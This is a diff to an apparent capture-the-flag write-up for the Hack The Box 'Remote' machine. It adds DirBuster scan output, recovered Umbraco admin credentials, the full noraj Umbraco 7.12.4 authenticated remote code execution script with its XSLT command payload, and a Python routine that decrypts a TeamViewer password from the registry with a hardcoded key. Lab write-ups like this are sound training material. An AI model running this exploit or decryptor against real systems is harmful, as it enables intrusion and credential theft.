@@ -2,11 +2,11 @@
 
 ## Overview
 
-![](https://github.com/zweilosec/htb-writeups/tree/9dba58d10cddb93939a2f0c0d6e0f97b7e65339b/windows-machines/easy/machine%3E.infocard.png)
+![](../../.gitbook/assets/0-remote-infocard.png)
 
 Short description to include any strange things to be dealt with
 
-TODO: finish writeup, add images, clean up
+TODO: finish writeup, add images, clean up...wow my notes were bad on this one!
 
 ## Useful Skills and Tools
 
@@ -82,15 +82,262 @@ Nmap done: 1 IP address (1 host up) scanned in 102.49 seconds
 
 start with anonymous ftp login - empty folder
 
+![](../../.gitbook/assets/1-http80.png)
+
+Acme widgets product page
+
+```text
+DirBuster 1.0-RC1 - Report
+http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
+Report produced on Sun Jul 05 12:10:29 EDT 2020
+--------------------------------
+
+http://10.10.10.180:80
+--------------------------------
+Directories found during testing:
+
+Dirs found with a 200 response:
+
+/
+/products/
+/people/
+/about-us/
+/contact/
+/intranet/
+/blog/
+/blog/another-one/
+/umbraco/
+/about-us/about-this-starter-kit/
+/products/biker-jacket/
+/about-us/todo-list-for-the-starter-kit/
+/blog/this-will-be-great/
+/1111/
+/products/unicorn/
+/blog/my-blog-post/
+/products/ping-pong-ball/
+/products/jumpsuit/
+/home/
+/Blog/
+/Contact/
+/Home/
+/blog/Blog/
+/People/
+/Products/
+/contact/Contact/
+/umbraco/Default/
+/umbraco/Default/assets/
+/umbraco/Default/lib/
+/people/People/
+/products/Products/
+
+Dirs found with a 403 response:
+
+/umbraco/assets/
+/App_Plugins/
+/App_Plugins/Terratype.GoogleMapsV3/
+/umbraco/assets/img/
+/umbraco/assets/img/application/
+/App_Plugins/Terratype.GoogleMapsV3/scripts/
+/umbraco/lib/
+/umbraco/lib/rgrove-lazyload/
+/App_Plugins/Terratype.GoogleMapsV3/Images/
+/umbraco/Members/
+/App_Plugins/Terratype.GoogleMapsV3/Scripts/
+/umbraco/Search/
+
+Dirs found with a 500 response:
+
+/about-us/Blog/
+/about-us/Contact/
+/people/Blog/
+/people/Contact/
+/blog/Contact/
+/blog/this-will-be-great/Blog/
+/products/Blog/
+/about-us/Home/
+/products/biker-jacket/Blog/
+/products/jumpsuit/Blog/
+/products/ping-pong-ball/Blog/
+/blog/this-will-be-great/Contact/
+/products/Contact/
+/products/jumpsuit/Contact/
+/intranet/Blog/
+/products/ping-pong-ball/Contact/
+/blog/another-one/Blog/
+/products/biker-jacket/Contact/
+/about-us/about-this-starter-kit/Blog/
+/people/Home/
+/contact/Blog/
+/products/unicorn/Blog/
+/intranet/Contact/
+/about-us/about-this-starter-kit/Contact/
+/blog/another-one/Contact/
+/blog/Home/
+/products/unicorn/Contact/
+/blog/this-will-be-great/Home/
+/about-us/todo-list-for-the-starter-kit/Blog/
+/about-us/People/
+/about-us/todo-list-for-the-starter-kit/Contact/
+/products/ping-pong-ball/Home/
+/about-us/Products/
+/products/jumpsuit/Home/
+/products/Home/
+/blog/my-blog-post/Blog/
+/products/biker-jacket/Home/
+/intranet/Home/
+/blog/another-one/Home/
+/products/unicorn/Home/
+/people/Products/
+/contact/Home/
+/about-us/about-this-starter-kit/Home/
+/blog/my-blog-post/Contact/
+/blog/People/
+/blog/Products/
+/blog/this-will-be-great/People/
+/blog/this-will-be-great/Products/
+/about-us/todo-list-for-the-starter-kit/Home/
+/products/People/
+/products/jumpsuit/People/
+/products/ping-pong-ball/People/
+/products/jumpsuit/Products/
+/products/ping-pong-ball/Products/
+/contact/People/
+/contact/Products/
+/blog/my-blog-post/Home/
+/products/biker-jacket/People/
+/intranet/People/
+/products/biker-jacket/Products/
+/about-us/about-this-starter-kit/People/
+/blog/another-one/People/
+/intranet/Products/
+/about-us/about-this-starter-kit/Products/
+/products/unicorn/People/
+/blog/another-one/Products/
+/products/unicorn/Products/
+/about-us/todo-list-for-the-starter-kit/People/
+/about-us/todo-list-for-the-starter-kit/Products/
+/blog/my-blog-post/People/
+/blog/my-blog-post/Products/
+
+
+--------------------------------
+Files found during testing:
+
+Files found with a 200 responce:
+
+/1111.aspx
+/scripts/umbraco-starterkit-app.js
+/App_Plugins/Terratype.GoogleMapsV3/scripts/Terratype.GoogleMapsV3.Renderer.js
+/App_Plugins/Terratype.GoogleMapsV3/scripts/markerclusterer.min.js
+/umbraco/lib/rgrove-lazyload/lazyload.js
+/umbraco/Application
+/Blog.aspx
+/Contact.aspx
+/Default.aspx
+/Home.aspx
+/People.aspx
+/Products.aspx
+/contact/Contact.aspx
+/blog/Blog.aspx
+/App_Plugins/Terratype.GoogleMapsV3/README.txt
+/App_Plugins/Terratype.GoogleMapsV3/Readme.txt
+/people/People.aspx
+/products/Products.aspx
+
+Files found with a 500 responce:
+
+/blog/my-blog-post/Blog.aspx
+/intranet/Blog.aspx
+/contact/Blog.aspx
+/blog/this-will-be-great/Blog.aspx
+/blog/my-blog-post/Contact.aspx
+/people/Blog.aspx
+/intranet/Contact.aspx
+/blog/this-will-be-great/Contact.aspx
+/people/Contact.aspx
+/products/unicorn/Blog.aspx
+/blog/another-one/Blog.aspx
+/blog/my-blog-post/Home.aspx
+/about-us/about-this-starter-kit/Blog.aspx
+/blog/another-one/Contact.aspx
+/blog/Contact.aspx
+/about-us/Blog.aspx
+/contact/Home.aspx
+/products/biker-jacket/Blog.aspx
+/products/Blog.aspx
+/products/jumpsuit/Blog.aspx
+/blog/this-will-be-great/Home.aspx
+/products/unicorn/Contact.aspx
+/people/Home.aspx
+/intranet/Home.aspx
+/products/ping-pong-ball/Blog.aspx
+/about-us/about-this-starter-kit/Contact.aspx
+/about-us/todo-list-for-the-starter-kit/Blog.aspx
+/products/biker-jacket/Contact.aspx
+/about-us/Contact.aspx
+/products/jumpsuit/Contact.aspx
+/products/Contact.aspx
+/products/ping-pong-ball/Contact.aspx
+/about-us/todo-list-for-the-starter-kit/Contact.aspx
+/blog/Home.aspx
+/products/unicorn/Home.aspx
+/blog/another-one/Home.aspx
+/contact/People.aspx
+/contact/Products.aspx
+/about-us/Home.aspx
+/products/Home.aspx
+/about-us/about-this-starter-kit/Home.aspx
+/blog/my-blog-post/People.aspx
+/blog/this-will-be-great/People.aspx
+/blog/my-blog-post/Products.aspx
+/products/biker-jacket/Home.aspx
+/products/jumpsuit/Home.aspx
+/blog/this-will-be-great/Products.aspx
+/intranet/People.aspx
+/products/ping-pong-ball/Home.aspx
+/intranet/Products.aspx
+/about-us/todo-list-for-the-starter-kit/Home.aspx
+/people/Products.aspx
+/blog/People.aspx
+/products/unicorn/People.aspx
+/blog/Products.aspx
+/blog/another-one/People.aspx
+/products/unicorn/Products.aspx
+/blog/another-one/Products.aspx
+/products/jumpsuit/People.aspx
+/products/biker-jacket/People.aspx
+/about-us/todo-list-for-the-starter-kit/People.aspx
+/about-us/about-this-starter-kit/People.aspx
+/products/jumpsuit/Products.aspx
+/products/biker-jacket/Products.aspx
+/about-us/about-this-starter-kit/Products.aspx
+/about-us/todo-list-for-the-starter-kit/Products.aspx
+/products/People.aspx
+/about-us/People.aspx
+/products/ping-pong-ball/People.aspx
+/about-us/Products.aspx
+/products/ping-pong-ball/Products.aspx
+
+Self-enumerated
+--------------------------------
+umbraco/create.aspx
+```
+
+Dirbuster found a huge list of standard Umbraco directories and files
+
 A search for umbraco+vulnerabilities = [https://www.acunetix.com/vulnerabilities/web/umbraco-cms-remote-code-execution/](https://www.acunetix.com/vulnerabilities/web/umbraco-cms-remote-code-execution/)
+
+![](../../.gitbook/assets/2-codeeditor.png)
 
 leads to [http://10.10.10.180/umbraco/webservices/codeEditorSave.asmx](http://10.10.10.180/umbraco/webservices/codeEditorSave.asmx) 
 
 [https://blog.gdssecurity.com/labs/2012/7/3/find-bugs-faster-with-a-webmatrix-local-reference-instance.html](https://blog.gdssecurity.com/labs/2012/7/3/find-bugs-faster-with-a-webmatrix-local-reference-instance.html)
 
+![](../../.gitbook/assets/9-notvulnerable.png)
+
 rabbit hole?^
 
-Dirbuster found a huge list of standard Umbraco directories and files
+![](../../.gitbook/assets/3-umbraco.png)
 
 navigating to `/umbraco` redirects to a login page at http:10.10.10.180/umbraco/\#/login.asp
 
@@ -141,13 +388,99 @@ file Web.config has line:  version number
 
 [https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data](https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data)
 
+![](../../.gitbook/assets/5-umbraco-sdf.png)
+
 App\_Data/Ubmbraco.sdf
+
+![](../../.gitbook/assets/4-creds.png)
 
 b8be16afba8c314ad33d812f22a04991b90e2aaa
 
 admin@htb.local:baconandcheese
 
+![](../../.gitbook/assets/6-friendly-cms.png)
+
+after logging in
+
+![](../../.gitbook/assets/7-user-cleanup.png)
+
+Lots of people were using this portal to try to gain access or run enumeration files it seemed.
+
+![](../../.gitbook/assets/8-ssmith.png)
+
 [https://github.com/noraj/Umbraco-RCE](https://github.com/noraj/Umbraco-RCE)
+
+```python
+# Exploit Title: Umbraco CMS - Authenticated Remote Code Execution 
+# Date: 2020-03-28
+# Exploit Author: Alexandre ZANNI (noraj)
+# Based on: https://www.exploit-db.com/exploits/46153
+# Vendor Homepage: http://www.umbraco.com/
+# Software Link: https://our.umbraco.com/download/releases
+# Version: 7.12.4
+# Category: Webapps
+# Tested on: Windows IIS
+# Example: python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c ipconfig
+
+import requests
+import re
+import argparse
+
+from bs4 import BeautifulSoup
+
+parser = argparse.ArgumentParser(prog='exploit.py',
+    description='Umbraco authenticated RCE',
+    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80))
+parser.add_argument('-u', '--user', metavar='USER', type=str,
+    required=True, dest='user', help='username / email')
+parser.add_argument('-p', '--password', metavar='PASS', type=str,
+    required=True, dest='password', help='password')
+parser.add_argument('-i', '--host', metavar='URL', type=str, required=True,
+    dest='url', help='root URL')
+parser.add_argument('-c', '--command', metavar='CMD', type=str, required=True,
+    dest='command', help='command')
+parser.add_argument('-a', '--arguments', metavar='ARGS', type=str, required=False,
+    dest='arguments', help='arguments', default='')
+args = parser.parse_args()
+
+# Payload
+payload = """\
+<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "%s"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "%s"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>\
+""" % (args.arguments, args.command)
+
+login = args.user
+password = args.password
+host = args.url
+
+# Process Login
+url_login = host + "/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"
+loginfo = { "username": login, "password": password}
+s = requests.session()
+r2 = s.post(url_login,json=loginfo)
+
+# Go to vulnerable web page
+url_xslt = host + "/umbraco/developer/Xslt/xsltVisualize.aspx"
+r3 = s.get(url_xslt)
+
+soup = BeautifulSoup(r3.text, 'html.parser')
+VIEWSTATE = soup.find(id="__VIEWSTATE")['value']
+VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value']
+UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN']
+headers = {'UMB-XSRF-TOKEN': UMBXSRFTOKEN}
+data = { "__EVENTTARGET": "", "__EVENTARGUMENT": "", "__VIEWSTATE": VIEWSTATE,
+    "__VIEWSTATEGENERATOR": VIEWSTATEGENERATOR,
+    "ctl00$body$xsltSelection": payload,
+    "ctl00$body$contentPicker$ContentIdValue": "",
+    "ctl00$body$visualizeDo": "Visualize+XSLT" }
+
+# Launch the attack
+r4 = s.post(url_xslt, data=data, headers=headers)
+# Filter output
+soup = BeautifulSoup(r4.text, 'html.parser')
+CMDOUTPUT = soup.find(id="result").getText()
+print(CMDOUTPUT)
+
+```
 
 exploit.py
 
@@ -332,6 +665,34 @@ PSParentPath              : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHI
 PSChildName               : Version7
 PSDrive                   : HKLM
 PSProvider                : Microsoft.PowerShell.Core\Registry
+```
+
+Got tv info stored in registry, including the Management password
+
+```python
+import sys, hexdump, binascii
+from Crypto.Cipher import AES
+
+class AESCipher:
+    def __init__(self, key):
+        self.key = key
+
+    def decrypt(self, iv, data):
+        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        return self.cipher.decrypt(data)
+
+key = binascii.unhexlify("0602000000a400005253413100040000")
+iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")
+hex_str_cipher = "357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77"			# output from the registry
+
+ciphertext = binascii.unhexlify(hex_str_cipher)
+
+raw_un = AESCipher(key).decrypt(iv, ciphertext)
+
+print(hexdump.hexdump(raw_un))
+
+password = raw_un.decode('utf-16')
+print(password)
 ```
 
 using the python exploit to decrypt the password store in the reg key
